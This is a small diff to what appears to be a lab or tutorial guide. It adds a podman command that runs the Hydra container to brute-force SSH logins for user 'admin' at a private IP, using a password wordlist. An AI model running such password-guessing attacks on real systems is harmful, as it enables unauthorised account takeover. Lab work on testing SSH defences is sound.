@@ -20,6 +20,9 @@ sudo apt install -y hydra
 
 ```bash
 sudo hydra -l <username> -P <PASSWD_LIST.txt> <Ubuntu_IP> ssh
+
+#if running hydra on RHEL use this command
+sudo podman run --rm -it -v /home/admin:/wordlists:z vanhauser/hydra   hydra -l admin -P /wordlists/passlist.txt 192.168.102.163 ssh
 ```
 
 <br>
